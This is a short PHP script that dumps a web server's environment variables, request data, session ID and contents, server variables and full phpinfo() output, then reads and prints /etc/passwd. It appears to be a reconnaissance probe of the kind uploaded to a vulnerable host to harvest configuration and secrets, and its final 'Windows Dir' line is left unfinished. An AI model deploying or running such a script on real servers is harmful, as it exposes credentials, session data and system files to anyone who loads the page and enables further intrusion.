<pre><?php
echo 'ENV details: ';
var_dump($_ENV);

echo 'GET details: ';
var_dump($_GET);


echo 'POST details: ';
var_dump($_POST);

echo '<br/>sessPath: ' . ini_get('session.save_path');
echo '<br/>sessCookie: ' . ini_get('session.cookie_path'); 
echo '<br/>sessName: ' . ini_get('session.name'); 
echo '<br/>SESSION details (Copy of, the sessions faked) : ';
echo('<br/>Session ID:'.session_id().'<br/>');
var_dump($_SESSION);


echo 'SERVER details: ';
var_dump($_SERVER);


echo 'PHPInfo() details: ';
phpinfo();

echo '<br/>Try to get /etc/passwd: ';
echo '<p>'.file_get_contents('/etc/passwd').'</p>';

echo 'Windows Dir: ';


?></pre>